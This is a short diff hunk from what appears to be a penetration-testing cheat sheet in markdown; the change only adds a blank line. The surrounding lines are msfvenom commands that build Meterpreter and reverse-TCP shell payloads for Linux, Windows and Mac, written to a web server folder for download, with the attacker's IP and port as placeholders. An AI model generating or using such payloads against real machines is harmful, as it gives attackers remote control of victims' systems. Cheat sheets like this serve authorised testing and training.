@@ -4,6 +4,7 @@
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=14704 -f elf >/var/www/html/shell.elf`
 #### Windows
   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=16041 -f exe >/var/www/html/pt16041.exe`
+  
   `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=6666 -f exe >/var/www/html/install.exe`
 #### Mac
   `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.machoWeb Payloads`
